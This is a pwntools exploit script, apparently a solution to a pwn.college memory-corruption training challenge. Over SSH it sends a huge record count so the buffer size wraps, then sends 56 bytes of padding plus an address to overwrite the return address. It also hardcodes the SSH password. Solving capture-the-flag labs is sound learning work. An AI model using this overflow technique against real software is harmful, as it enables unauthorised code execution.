from pwn import *

context.arch = 'amd64'
context.os = 'linux'

FILE = "/challenge/babymem-level-5-1"
HOST = 'pwn.college'
username = 'hacker'
password = '''425192'''

port = 22

conn = ssh(user=username, host=HOST, password=password, port=port)

# Run a command on the server
process = conn.process(FILE)

payload = b"A"*56 +  p64(0x402007)
intMax = str((2**31)).encode()
process.recvuntil(b"Number of payload records to send: ")
process.sendline(intMax)
process.recvuntil(b"Size of each payload record: ")
process.sendline(b"2")
process.sendline(payload)
process.interactive()
# Close the connection
conn.close()
